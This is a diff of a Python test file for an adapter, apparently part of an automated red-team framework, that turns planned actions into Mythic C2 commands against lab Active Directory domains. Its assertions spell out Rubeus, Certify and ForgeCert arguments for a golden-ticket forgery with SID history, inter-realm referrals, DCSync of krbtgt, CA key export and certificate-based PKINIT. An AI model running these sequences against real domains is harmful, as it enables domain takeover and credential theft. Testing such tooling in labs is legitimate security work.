@@ -344,19 +344,23 @@ def test_adapter_translates_forge_golden_ticket_to_managed_kerberos_context_sequ
         "aes256": "d" * 64,
         "extra_sids": ["S-1-5-21-3033212248-4076524963-940182272-519"],
         "proof_host": "kingslanding.sevenkingdoms.local",
+        "child_dc": "winterfell.north.sevenkingdoms.local",
     })
 
     mythic_plan = adapter.build_mythic_capability_commands(execution_plan)
 
     assert mythic_plan.ok is True
+    # Cross-domain forge: child referral -> parent LDAP ticket -> load service ticket -> parent DCSync.
     assert [command.command for command in mythic_plan.commands] == [
         "shell",
         "shell",
         "execute_assembly",
-        "make_token",
-        "ticket_store_add",
-        "ticket_store_list",
-        "shell",
+        "execute_assembly",
+        "execute_assembly",
+        "ticket_cache_purge",
+        "ticket_cache_add",
+        "ticket_cache_list",
+        "dcsync",
     ]
     preflight_list = mythic_plan.commands[0]
     assert preflight_list.produces == ["kerberos_context_inventory"]
@@ -375,23 +379,83 @@ def test_adapter_translates_forge_golden_ticket_to_managed_kerberos_context_sequ
     assert "/nowrap" in rendered
     assert "/ptt" not in rendered
     assert command.produces == ["kerberos_ticket_base64"]
-    logon = mythic_plan.commands[3]
-    assert logon.produces == ["kerberos_logon_context"]
-    assert set(logon.parameters) == {"credential", "netOnly"}
-    assert logon.parameters["credential"]["realm"] == "sevenkingdoms.local"
-    assert logon.parameters["credential"]["account"] == "Administrator"
-    assert mythic_plan.commands[4].deferred is True
-    assert "kerberos_ticket_base64" in mythic_plan.commands[4].consumes
-    assert mythic_plan.commands[5].parameters == {"luid": ""}
-    proof = mythic_plan.commands[6]
-    assert proof.parameters == "dir \\\\kingslanding.sevenkingdoms.local\\C$"
-    assert proof.consumes == ["kerberos_ticket_imported", "kerberos_logon_context"]
-    assert proof.produces == ["kerberos_service_access_probe"]
+    referral = mythic_plan.commands[3]
+    assert referral.parameters["assembly_name"] == "Rubeus.exe"
+    referral_args = referral.parameters["assembly_arguments"]
+    assert referral_args.startswith("asktgs /ticket:{{kerberos_ticket_base64}}")
+    assert "/service:krbtgt/sevenkingdoms.local" in referral_args
+    assert "/dc:winterfell.north.sevenkingdoms.local" in referral_args
+    assert referral.deferred is True
+    assert referral.consumes == ["kerberos_ticket_base64"]
+    assert referral.produces == ["kerberos_ticket_base64"]
+    service_ticket = mythic_plan.commands[4]
+    service_ticket_args = service_ticket.parameters["assembly_arguments"]
+    assert service_ticket_args.startswith("asktgs /ticket:{{kerberos_ticket_base64}}")
+    assert "/service:ldap/kingslanding.sevenkingdoms.local" in service_ticket_args
+    assert "/dc:kingslanding.sevenkingdoms.local" in service_ticket_args
+    assert service_ticket.deferred is True
+    assert service_ticket.consumes == ["kerberos_ticket_base64"]
+    assert service_ticket.produces == ["kerberos_ticket_base64"]
+    assert mythic_plan.commands[5].parameters == {
+        "all": True,
+        "serviceName": "",
+        "luid": "",
+    }
+    importer = mythic_plan.commands[6]
+    assert importer.deferred is True
+    assert "kerberos_ticket_base64" in importer.consumes
+    assert "kerberos_logon_context" not in importer.consumes
+    assert importer.parameters == {"base64ticket": "{{kerberos_ticket_base64}}"}
+    assert importer.produces == ["kerberos_ticket_imported"]
+    assert mythic_plan.commands[7].parameters == {
+        "luid": "",
+        "getSystemTickets": False,
+    }
+    assert mythic_plan.commands[7].consumes == ["kerberos_ticket_imported"]
+    proof = mythic_plan.commands[8]
+    assert proof.command == "dcsync"
+    assert proof.parameters["domain"] == "sevenkingdoms.local"
+    assert proof.parameters["user"] == "SEVENKINGDOMS\\krbtgt"
+    assert proof.parameters["dc"] == "kingslanding.sevenkingdoms.local"
     assert proof.deferred is False
     assert intent_classifier.classify_tool_call(command.command, command.parameters) == (
         "sid-history-escalation",
         "north.sevenkingdoms.local",
     )
+
+
+def test_cross_domain_dcsync_step_forces_native_executor_over_global_mimikatz_config():
+    action = capabilities.CapabilityAction(
+        name="forge-golden-ticket",
+        target="domain=child.root.local;target_domain=root.local",
+        preconditions=["krbtgt-hash:child.root.local"],
+        effects=["da:root.local"],
+        intent={
+            "capability": "forge-golden-ticket",
+            "domain": "child.root.local",
+            "target_domain": "root.local",
+        },
+    )
+    execution_plan = capabilities.build_capability_execution_plan(action, {
+        "domain_sid": "S-1-5-21-111-222-333",
+        "aes256": "a" * 64,
+        "extra_sids": ["S-1-5-21-444-555-666-519"],
+        "proof_host": "dc01.root.local",
+        "child_dc": "dc01.child.root.local",
+    })
+
+    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, {
+        "executor": "mimikatz",
+        "mimikatz_command": "execute_pe",
+    })
+
+    proof = mythic_plan.commands[-1]
+    assert proof.command == "dcsync"
+    assert proof.parameters == {
+        "domain": "root.local",
+        "user": "ROOT\\krbtgt",
+        "dc": "dc01.root.local",
+    }
 
 
 def test_adapter_translates_current_context_ticket_purge():
@@ -417,6 +481,95 @@ def test_adapter_translates_current_context_ticket_purge():
     assert command.parameters == "klist purge"
     assert command.consumes == []
     assert command.produces == ["kerberos_current_tickets_purged"]
+
+
+def test_adapter_translates_inter_realm_referral_to_deferred_asktgs():
+    plan = capabilities.CapabilityExecutionPlan(
+        True,
+        steps=[
+            capabilities.CapabilityExecutionStep(
+                operation="kerberos-inter-realm-referral",
+                parameters={
+                    "target_domain": "sevenkingdoms.local",
+                    "service": "krbtgt/sevenkingdoms.local",
+                    "ticket_base64": "{{kerberos_ticket_base64}}",
+                    "child_dc": "winterfell.north.sevenkingdoms.local",
+                    "nowrap": True,
+                },
+                capability="forge-golden-ticket",
+                purpose="exchange the forged ticket for an inter-realm referral",
+                expected_probe="extract_forged_ticket_artifact",
+            ),
+        ],
+    )
+
+    mythic_plan = adapter.build_mythic_capability_commands(plan)
+
+    assert mythic_plan.ok is True
+    assert len(mythic_plan.commands) == 1
+    command = mythic_plan.commands[0]
+    assert command.command == "execute_assembly"
+    args = command.parameters["assembly_arguments"]
+    assert args.startswith("asktgs /ticket:{{kerberos_ticket_base64}}")
+    assert "/service:krbtgt/sevenkingdoms.local" in args
+    assert "/dc:winterfell.north.sevenkingdoms.local" in args
+    assert "/nowrap" in args
+    # The referral output overwrites the same ticket slot so the downstream import consumes the referral.
+    assert command.deferred is True
+    assert command.consumes == ["kerberos_ticket_base64"]
+    assert command.produces == ["kerberos_ticket_base64"]
+
+
+def test_adapter_inter_realm_referral_fails_closed_without_child_dc():
+    plan = capabilities.CapabilityExecutionPlan(
+        True,
+        steps=[
+            capabilities.CapabilityExecutionStep(
+                operation="kerberos-inter-realm-referral",
+                parameters={"target_domain": "sevenkingdoms.local"},
+                capability="forge-golden-ticket",
+                purpose="referral without a resolved child DC",
+                expected_probe="extract_forged_ticket_artifact",
+            ),
+        ],
+    )
+
+    mythic_plan = adapter.build_mythic_capability_commands(plan)
+
+    assert mythic_plan.ok is False
+    assert "dc" in mythic_plan.missing
+
+
+def test_adapter_translates_parent_service_ticket_request_to_deferred_asktgs():
+    plan = capabilities.CapabilityExecutionPlan(
+        True,
+        steps=[
+            capabilities.CapabilityExecutionStep(
+                operation="kerberos-service-ticket-request",
+                parameters={
+                    "target_domain": "root.local",
+                    "service": "ldap/dc01.root.local",
+                    "ticket_base64": "{{kerberos_ticket_base64}}",
+                    "dc": "dc01.root.local",
+                },
+                capability="forge-golden-ticket",
+                purpose="exchange referral for LDAP service ticket",
+                expected_probe="extract_forged_ticket_artifact",
+            ),
+        ],
+    )
+
+    mythic_plan = adapter.build_mythic_capability_commands(plan)
+
+    assert mythic_plan.ok is True
+    command = mythic_plan.commands[0]
+    assert command.command == "execute_assembly"
+    assert command.parameters["assembly_arguments"].startswith(
+        "asktgs /ticket:{{kerberos_ticket_base64}} /service:ldap/dc01.root.local /dc:dc01.root.local"
+    )
+    assert command.deferred is True
+    assert command.consumes == ["kerberos_ticket_base64"]
+    assert command.produces == ["kerberos_ticket_base64"]
 
 
 def test_adapter_marks_service_proof_deferred_until_resource_is_bound():
@@ -1085,6 +1238,9 @@ def test_adapter_translates_adcs_ca_private_key_export_to_wmiexecute_readback():
     assert "CA_EXPORT_STATUS=OK" in ps
     assert "PFX_SHA256=" in ps
     assert "PFX_BASE64=" in ps
+    assert "$exportedCert=New-Object System.Security.Cryptography.X509Certificates.X509Certificate2" in ps
+    assert "('CA_SUBJECT='+$exportedCert.Subject)" in ps
+    assert "('CA_THUMBPRINT='+$exportedCert.Thumbprint)" in ps
     readback = mythic_plan.commands[1]
     assert readback.expected_probe == "extract_adcs_ca_private_key_probe"
     assert readback.consumes == ["remote_process_created"]
@@ -1214,7 +1370,76 @@ def test_adapter_translates_adcs_esc_certificate_enroll_to_native_certreq_powerp
     assert "SAGE_CERT_ENROLL_PROOF_administrator_lab_local_14" in command.parameters
 
 
-def test_adapter_translates_adcs_certificate_auth_to_forgecert_pkinit_context_sequence():
+def test_adapter_translates_adcs_certificate_auth_to_certify_pkinit_context_sequence():
+    action = capabilities.CapabilityAction(
+        name="adcs-certificate-auth",
+        target="domain=lab.local;account=administrator;ca_host=ca01;callback=14",
+        preconditions=["adcs-ca-private-key:ca01@lab.local", "live-callback:14"],
+        effects=["da:lab.local", "certificate-auth:administrator@lab.local"],
+        intent={
+            "capability": "adcs-certificate-auth",
+            "domain": "lab.local",
+            "account": "administrator",
+            "ca_host": "ca01",
+            "callback_id": "14",
+        },
+    )
+    execution_plan = capabilities.build_capability_execution_plan(action, {
+        "ca_pfx_path": r"C:\Windows\Temp\ca.pfx",
+        "ca_pfx_password": "CA Secret!",
+        "account_sid": "S-1-5-21-111-222-333-500",
+        "proof_host": "dc01.lab.local",
+        "dc": "dc01.lab.local",
+    })
+
+    mythic_plan = adapter.build_mythic_capability_commands(execution_plan)
+
+    assert mythic_plan.ok is True
+    assert [command.command for command in mythic_plan.commands] == [
+        "shell",
+        "shell",
+        "execute_assembly",
+        "execute_assembly",
+        "make_token",
+        "ticket_store_add",
+        "ticket_store_list",
+        "shell",
+    ]
+    forge = mythic_plan.commands[2]
+    assert forge.parameters["assembly_name"] == "Certify.exe"
+    forge_args = forge.parameters["assembly_arguments"]
+    assert forge_args.startswith("forge --ca-cert C:\\Windows\\Temp\\ca.pfx")
+    assert '--ca-pass "CA Secret!"' in forge_args
+    assert "--subject CN=administrator" in forge_args
+    assert "--upn administrator@lab.local" in forge_args
+    assert "--sid S-1-5-21-111-222-333-500" in forge_args
+    assert "--crl ldap:///" in forge_args
+    assert "--output-path C:\\Windows\\Temp\\sage_forged_cert_administrator_lab_local_14.pfx" in forge_args
+    assert forge.produces == ["forged_certificate_pfx"]
+
+    pkinit = mythic_plan.commands[3]
+    assert pkinit.parameters["assembly_name"] == "Rubeus.exe"
+    pkinit_args = pkinit.parameters["assembly_arguments"]
+    assert pkinit_args.startswith("asktgt /user:administrator /domain:lab.local")
+    assert "/certificate:C:\\Windows\\Temp\\sage_forged_cert_administrator_lab_local_14.pfx" in pkinit_args
+    # The forged-PFX password is now a per-run random (no hardcoded constant): assert the slug-scoped
+    # artifact_secret form (SageCert-<run-salt>-<slug>) rather than a pinned literal.
+    import re as _re_pw
+    assert _re_pw.search(r"/password:SageCert-[0-9a-f]+-administrator_lab_local_14\b", pkinit_args), pkinit_args
+    assert "/getcredentials" in pkinit_args
+    assert "/show" in pkinit_args
+    assert "/nowrap" in pkinit_args
+    assert "/dc:dc01.lab.local" in pkinit_args
+    assert "/ptt" not in pkinit_args
+    assert "kerberos_ticket_base64" in pkinit.produces
+    assert mythic_plan.commands[5].deferred is True
+    proof = mythic_plan.commands[-1]
+    assert proof.expected_probe == "extract_adcs_certificate_auth_probe"
+    assert proof.parameters == r"echo SAGE_CERT_AUTH_PROOF_administrator_lab_local_14 & dir \\dc01.lab.local\C$"
+    assert proof.consumes == ["kerberos_ticket_imported", "kerberos_logon_context"]
+
+
+def test_adapter_can_explicitly_use_legacy_forgecert_backend():
     action = capabilities.CapabilityAction(
         name="adcs-certificate-auth",
         target="domain=lab.local;account=administrator;ca_host=ca01;callback=14",
@@ -1234,48 +1459,19 @@ def test_adapter_translates_adcs_certificate_auth_to_forgecert_pkinit_context_se
         "proof_host": "dc01.lab.local",
     })
 
-    mythic_plan = adapter.build_mythic_capability_commands(execution_plan)
+    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, {
+        "certificate_forge_tool": "ForgeCert.exe",
+        "certificate_forge_backend": "forgecert",
+    })
 
     assert mythic_plan.ok is True
-    assert [command.command for command in mythic_plan.commands] == [
-        "shell",
-        "shell",
-        "execute_assembly",
-        "execute_assembly",
-        "make_token",
-        "ticket_store_add",
-        "ticket_store_list",
-        "shell",
-    ]
     forge = mythic_plan.commands[2]
     assert forge.parameters["assembly_name"] == "ForgeCert.exe"
     forge_args = forge.parameters["assembly_arguments"]
     assert "--CaCertPath C:\\Windows\\Temp\\ca.pfx" in forge_args
     assert '--CaCertPassword "CA Secret!"' in forge_args
-    assert "--Subject CN=administrator" in forge_args
     assert "--SubjectAltName administrator@lab.local" in forge_args
     assert "--NewCertPath C:\\Windows\\Temp\\sage_forged_cert_administrator_lab_local_14.pfx" in forge_args
-    assert forge.produces == ["forged_certificate_pfx"]
-
-    pkinit = mythic_plan.commands[3]
-    assert pkinit.parameters["assembly_name"] == "Rubeus.exe"
-    pkinit_args = pkinit.parameters["assembly_arguments"]
-    assert pkinit_args.startswith("asktgt /user:administrator /domain:lab.local")
-    assert "/certificate:C:\\Windows\\Temp\\sage_forged_cert_administrator_lab_local_14.pfx" in pkinit_args
-    # The forged-PFX password is now a per-run random (no hardcoded constant): assert the slug-scoped
-    # artifact_secret form (SageCert-<run-salt>-<slug>) rather than a pinned literal.
-    import re as _re_pw
-    assert _re_pw.search(r"/password:SageCert-[0-9a-f]+-administrator_lab_local_14\b", pkinit_args), pkinit_args
-    assert "/getcredentials" in pkinit_args
-    assert "/show" in pkinit_args
-    assert "/nowrap" in pkinit_args
-    assert "/ptt" not in pkinit_args
-    assert "kerberos_ticket_base64" in pkinit.produces
-    assert mythic_plan.commands[5].deferred is True
-    proof = mythic_plan.commands[-1]
-    assert proof.expected_probe == "extract_adcs_certificate_auth_probe"
-    assert proof.parameters == r"echo SAGE_CERT_AUTH_PROOF_administrator_lab_local_14 & dir \\dc01.lab.local\C$"
-    assert proof.consumes == ["kerberos_ticket_imported", "kerberos_logon_context"]
 
 
 def test_adapter_translates_adcs_certificate_auth_to_schannel_ldap_proof():
@@ -1313,6 +1509,12 @@ def test_adapter_translates_adcs_certificate_auth_to_schannel_ldap_proof():
     assert "AuthType]::External" in script
     assert "QueryClientCertificate" in script
     assert "StartTransportLayerSecurity" in script
+    assert ".Bind();" not in script
+    assert "$searchResponse=$candidate.SendRequest($probeRequest)" in script
+    assert "X509KeyStorageFlags]::Exportable" in script
+    assert "MachineKeySet" not in script
+    assert "CERT_AUTH_WHOAMI=" in script
+    assert "$g=& $toText $group" in script
     assert "CERT_AUTH_TRANSPORT=" in script
     assert "CERT_AUTH_METHOD=schannel-ldap" in script
     assert "CERT_AUTH_DOMAIN_ADMIN=" in script
